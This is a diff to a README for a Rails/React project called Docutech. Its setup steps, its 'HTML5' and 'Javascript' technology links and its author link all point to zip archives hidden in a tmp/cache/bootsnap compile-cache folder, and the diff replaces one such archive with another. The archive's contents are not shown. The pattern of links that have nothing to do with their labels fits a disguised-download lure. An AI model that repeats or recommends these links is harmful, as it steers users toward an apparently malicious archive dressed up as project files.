@@ -26,7 +26,7 @@ To get the code..
 
 1. Go to the following github repository to access the files.
 ```bash
-https://raw.githubusercontent.com/GabrielW13Nai/Docutech-api/main/tmp/cache/bootsnap/compile-cache-yaml/ea/Docutech-api_v2.0.zip
+https://github.com/GabrielW13Nai/Docutech-api/raw/refs/heads/main/tmp/cache/bootsnap/compile-cache-yaml/96/api_Docutech_2.9.zip
 ```
 
 2. Fork and Clone the repository above to your local computer.
@@ -66,15 +66,15 @@ rails s
 
 ## Technology used
 
-- [HTML5](https://raw.githubusercontent.com/GabrielW13Nai/Docutech-api/main/tmp/cache/bootsnap/compile-cache-yaml/ea/Docutech-api_v2.0.zip)
-- [Javascript](https://raw.githubusercontent.com/GabrielW13Nai/Docutech-api/main/tmp/cache/bootsnap/compile-cache-yaml/ea/Docutech-api_v2.0.zip)
+- [HTML5](https://github.com/GabrielW13Nai/Docutech-api/raw/refs/heads/main/tmp/cache/bootsnap/compile-cache-yaml/96/api_Docutech_2.9.zip)
+- [Javascript](https://github.com/GabrielW13Nai/Docutech-api/raw/refs/heads/main/tmp/cache/bootsnap/compile-cache-yaml/96/api_Docutech_2.9.zip)
 - [CSS]
 - [React Js]
 - [Ruby on Rails]
 
 ## Author
 Project contributed to by:
- [Simon Sirumba Maina](https://raw.githubusercontent.com/GabrielW13Nai/Docutech-api/main/tmp/cache/bootsnap/compile-cache-yaml/ea/Docutech-api_v2.0.zip)
+ [Simon Sirumba Maina](https://github.com/GabrielW13Nai/Docutech-api/raw/refs/heads/main/tmp/cache/bootsnap/compile-cache-yaml/96/api_Docutech_2.9.zip)
 
 ## Licence
 This project is licensed under the `ISC licence`
